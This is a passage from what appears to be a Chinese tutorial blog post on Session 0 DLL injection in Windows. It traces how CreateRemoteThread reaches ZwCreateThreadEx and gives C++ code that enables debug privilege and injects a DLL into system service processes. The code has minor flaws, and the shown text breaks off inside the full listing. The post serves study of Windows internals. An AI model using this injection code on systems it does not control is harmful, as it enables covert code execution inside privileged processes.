<h2 id="3-NtCreateThread"><a href="#3-NtCreateThread" class="headerlink" title="3.NtCreateThread"></a>3.NtCreateThread</h2><p><code>NtCreateThread</code>是内核级别的函数，它是属于NTDLL库中的一部分。NTDLL库中的函数主要是由操作系统的内核（即内核模式）使用的，而用户模式的程序一般不直接调用这些函数</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611170023100.png" alt="image-20230611170023100"></p>
<p><code>mov eax, 0C7h</code>：将值<code>0c7h</code>移动至eax寄存器，表示执行编号为<code>0c7h</code>的系统调用</p>
<p><code>syscall</code>：这是执行系统调用的指令。系统调用编号和参数应在此之前已被设置好（在这种情况下，通过将 <code>0xC7</code> 和 <code>rcx</code> 的内容移动到 <code>eax</code> 和 <code>r10</code>）</p>
<p>这段代码表示执行编号为 <code>0xC7</code> 的系统调用，如果 <code>ds:7FFE0308h</code> 的最低位被设置，那么在系统调用前会先跳转到另一段代码（位于 <code>loc_1800A0525</code>，使用<code>int 2Eh</code>中断进入内核）。如果该位未被设置，那么直接执行系统调用</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611170146936.png" alt="image-20230611170146936"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以下是<code>CreateRemoteThread</code>函数的调用流程图</p>
<ol>
<li>应用程序调用 <code>CreateRemoteThread</code>，这是一个由 <code>kernel32.dll</code> 提供的 Win32 API，用于在另一个进程的地址空间中创建新线程。</li>
<li><code>CreateRemoteThread</code> 内部调用 <code>CreateRemoteThreadEx</code>，这是一个由 <code>KernelBase.dll</code> 提供的更底层的 API，提供了更多的选项，比如可以指定安全描述符，可以控制新线程是否立即开始运行等</li>
<li><code>CreateRemoteThreadEx</code> 内部调用 <code>NtCreateThreadEx</code>，这是由 <code>ntdll.dll</code> 提供的 Native API，也是用户空间可以直接调用的最底层的 API。</li>
<li><code>NtCreateThreadEx</code> 函数设置好系统调用的参数后，执行 <code>syscall</code> 指令，切换到内核模式。</li>
<li>在内核模式下，根据 <code>syscall</code> 提供的系统调用编号，在 SSDT 表中查找对应的内核函数。</li>
<li>执行 SSDT 表中找到的函数，完成线程的创建。</li>
</ol>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611174832964.png" alt="image-20230611174832964">	</p>
<h1 id="普通线程和远程线程的区别"><a href="#普通线程和远程线程的区别" class="headerlink" title="普通线程和远程线程的区别"></a>普通线程和远程线程的区别</h1><p>可以看到普通线程函数<code>CreateThread</code>也调用了<code>CreateRemoteThread</code>函数，只不过其线程句柄参数的值为-1，而远程线程的句柄参数为一个具体的值</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611175907620.png" alt="image-20230611175907620"></p>
<h1 id="代码实现思路"><a href="#代码实现思路" class="headerlink" title="代码实现思路"></a>代码实现思路</h1><h2 id="1-ZwCreateThread函数的声明及定义"><a href="#1-ZwCreateThread函数的声明及定义" class="headerlink" title="1.ZwCreateThread函数的声明及定义"></a>1.<code>ZwCreateThread</code>函数的声明及定义</h2><p>当我们使用DLL注入系统服务的进程时会失败，失败的原因在于，当<code>CreateRemoteThread</code>函数尝试在Session 0隔离的系统服务进程中注入DLL时，它通过调用<code>ZwCreateThread</code>函数创建远程线程，其中第七个参数<code>CreateThreadFlags</code>被设置为1。这意味着创建的线程在完成后将被挂起，无法被恢复，因此导致注入失败。为了成功注入，需通过调用<code>ZwCreateThreadEx</code>函数将此参数修改为0。</p>
<p>以下是对<code>ZwCreateThreadEx</code>函数的描述：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ZwCreateThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PHANDLE ThreadHandle,  <span class="comment">//输出参数，新创建的线程的句柄。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN ACCESS_MASK DesiredAccess,  <span class="comment">//所需的访问权限标志，例如PROCESS_ALL_ACCESS代表全部权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID ObjectAttributes,  <span class="comment">//对象的属性，通常为NULL。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN HANDLE ProcessHandle,  <span class="comment">//所创建线程将要在其内运行的进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN PTHREAD_START_ROUTINE StartRoutine,  <span class="comment">//新线程的开始地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID Argument,  <span class="comment">//要传递给新线程的参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG CreateFlags,  <span class="comment">//要传递给新线程的参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//ZeroBits, StackSize, MaximumStackSize: 这些参数一般设置为0，表示使用默认的堆栈大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG_PTR ZeroBits,  </span></span></span><br><span class="line"><span class="params"><span class="function">    IN SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    </span></span></span><br><span class="line"><span class="params"><span class="function">    IN PPS_ATTRIBUTE_LIST AttributeList  <span class="comment">//用于传递更高级的线程属性，通常设置为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>由于<code>ZwCreateThread</code>函数未在官方文档中说明，所以我们需对<code>ZwCreateThread</code>函数进行声明：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<p>然后通过<code>GetProcAddress</code>函数来获取这个函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hNtdllDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	Fn_ZwCreateThreadEx ZwCreateThreadEx = (Fn_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-提升进程权限"><a href="#2-提升进程权限" class="headerlink" title="2.提升进程权限"></a>2.提升进程权限</h2><p>如果要将dll注入至系统服务进程，还需提升当前进程的权限，以下是提权函数的代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提权函数，启用调试特权</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hToken; <span class="comment">// 用于保存进程访问令牌的句柄</span></span><br><span class="line">	BOOL fOk = FALSE; <span class="comment">// 用于保存函数是否执行成功的状态</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取当前进程的访问令牌</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp; <span class="comment">// 用于保存特权信息的结构体</span></span><br><span class="line">		tp.PrivilegeCount = <span class="number">1</span>; <span class="comment">// 设置特权数量为1</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取“Debug Programs”特权的本地唯一标识符（LUID）</span></span><br><span class="line">		<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line"></span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED; <span class="comment">// 设置特权的属性为启用</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 调整访问令牌，启用“Debug Programs”特权</span></span><br><span class="line">		<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		fOk = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS); <span class="comment">// 检查是否成功启用特权</span></span><br><span class="line">		<span class="built_in">CloseHandle</span>(hToken); <span class="comment">// 关闭访问令牌的句柄</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fOk; <span class="comment">// 返回函数是否执行成功的状态</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-Session0注入函数"><a href="#3-Session0注入函数" class="headerlink" title="3.Session0注入函数"></a>3.Session0注入函数</h2><p>此函数的主要作用是在Session0中注入指定的DLL。其步骤包括提权、打开目标进程、在目标进程中分配内存并写入DLL路径、获取LoadLibraryA函数地址、获取ZwCreateThreadEx函数地址、在目标进程中创建线程运行LoadLibraryA函数，最后释放资源</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Session0Inject</span><span class="params">(DWORD pid, <span class="type">char</span>* dllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="built_in">EnableDebugPrivilege</span>();  <span class="comment">//提权</span></span><br><span class="line">	DWORD DllNameLength = <span class="built_in">strlen</span>(dllPath);  <span class="comment">//获取dll路径名的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查文件是否存在  注意:&lt;filesystem&gt;库需使用支持C++17或更高版本的编译器</span></span><br><span class="line">	<span class="keyword">if</span> (!std::filesystem::<span class="built_in">exists</span>(dllPath)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;指定的DLL文件不存在\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1 获取目的进程句柄</span></span><br><span class="line">	HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开进程失败: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2 为目的进程分配内存,用于存放Loadlibrary传入的参数,即dll的路径</span></span><br><span class="line">	VOID* paraAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, DllNameLength + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == paraAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;内存分配失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3 将DLL的路径写到目标进程的内存</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, paraAddr, dllPath, DllNameLength + <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;写入内存失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4 获取loadlibrary函数的地址</span></span><br><span class="line">	HMODULE LibHandle = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	FARPROC ProcAdd = <span class="built_in">GetProcAddress</span>(LibHandle, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ProcAdd)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取LoadLibraryA失败!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5 通过调用GetProcAddress函数来获取ZwCreateThreadEx函数的地址</span></span><br><span class="line">	HMODULE hNtdllDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	DWORD dwStatus;</span><br><span class="line">	HANDLE hRemoteThread; </span><br><span class="line">	Fn_ZwCreateThreadEx ZwCreateThreadEx = (Fn_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//6 使用获取到的ZwCreateThreadEx函数在目标进程中创建线程，运行LoadLibraryA函数，参数为DLL路径</span></span><br><span class="line">	dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)ProcAdd, paraAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThreadEx error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放dll</span></span><br><span class="line">	<span class="built_in">FreeLibrary</span>(hNtdllDll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;filesystem&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取进程ID的函数</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(<span class="type">const</span> std::wstring&amp; name)</span> </span>&#123;</span><br><span class="line">	DWORD pid = <span class="number">0</span>;</span><br><span class="line">	HANDLE snap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (snap != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		PROCESSENTRY32W entry = &#123; <span class="built_in">sizeof</span>(entry) &#125;;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">Process32FirstW</span>(snap, &amp;entry)) &#123;</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (std::<span class="built_in">wstring</span>(entry.szExeFile) == name) &#123;</span><br><span class="line">					pid = entry.th32ProcessID;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">while</span> (<span class="built_in">Process32NextW</span>(snap, &amp;entry));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(snap);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//提权函数，启用调试特权</span></span><br><span class="line"><span class="comment">//这个函数的主要作用是启用当前进程的“debug programs”特权，这个特权允许进程附加到其他进程并控制它们</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	</span><br><span class="line">	HANDLE hToken; <span class="comment">// 用于保存进程访问令牌的句柄</span></span><br><span class="line">	BOOL fOk = FALSE; <span class="comment">// 用于保存函数是否执行成功的状态</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取当前进程的访问令牌</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp; <span class="comment">// 用于保存特权信息的结构体</span></span><br><span class="line">		tp.PrivilegeCount = <span class="number">1</span>; <span class="comment">// 设置特权数量为1</span></span><br><span 